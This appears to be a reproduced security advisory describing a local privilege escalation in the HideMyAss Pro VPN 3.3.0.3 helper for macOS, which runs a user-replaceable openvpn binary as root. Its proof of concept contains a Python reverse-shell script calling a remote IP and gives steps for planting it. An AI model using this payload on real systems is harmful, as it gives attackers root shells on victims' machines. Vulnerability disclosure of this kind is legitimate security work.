@@ -1,0 +1,43 @@
+Source: https://www.securify.nl/advisory/SFY20170408/local_privilege_escalation_vulnerability_in_hidemyass_pro_vpn_client_v3_x_for_macos.html
+
+Abstract
+A local privilege escalation vulnerability has been found in the helper binary com.privax.hmaprovpn.helper that ships with HideMyAss Pro VPN v3.3.0.3 for macOS. The helper is installed setuid root and uses the openvpn binary to create VPN profiles and connections. The helper fails to perform signature check's on the openvpn file, which is owned by the user that installed the client. This allows malware on the system to replace the openvpn binary and run arbitrary code as root.
+
+
+Tested versions:
+This issue was tested on HideMyAss Pro VPN v3.3.0.3 for macOS.
+
+
+Fix:
+There is currently no fix available.
+
+
+Introduction:
+HideMyAss is a popular VPN service that allows users to hide their identity and browse anonymously online. HideMyAss also provides applications to setup the VPN connections, including a client for macOS. It was discovered that version 3.x of HMA Pro VPN for macOS is affected by local privilege escalation.
+
+
+Details:
+The helper binary com.privax.hmaprovpn.helper that ships with HideMyAss Pro VPN v3.3.0.3 for macOS is installed in PrivilegedHelperTools and run every time the user reboots. The privileged helper is responsible for opening VPN connections with correct security and connection profile settings.
+
+The com.privax.hmaprovpn.helper is installed setuid root and fails to perform signature check's on the openvpn executable, which is owned by the user that installed the client. This allows malware on the system to replace the openvpn binary and run arbitrary code as root.
+
+/advisory/SFY20170408/runopenvpnasroot.png
+/advisory/SFY20170408/startopenvpn.png
+
+
+Proof of Concept:
+1) Create an Python script named openvpn and make sure it is executable (chmod u+x).
+
+#!/usr/bin/python
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.0.0.28",8099));os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+
+2) Replace the openvpn binary located in the path below with this Python script.
+
+/Applications/HMA\!\ Pro\ VPN.app/Contents/XPCServices/HMA\!\ Pro\ VPN\ Engine.xpc/Contents/MacOS/
+
+3) Wait until the victim opens a VPN connection. 
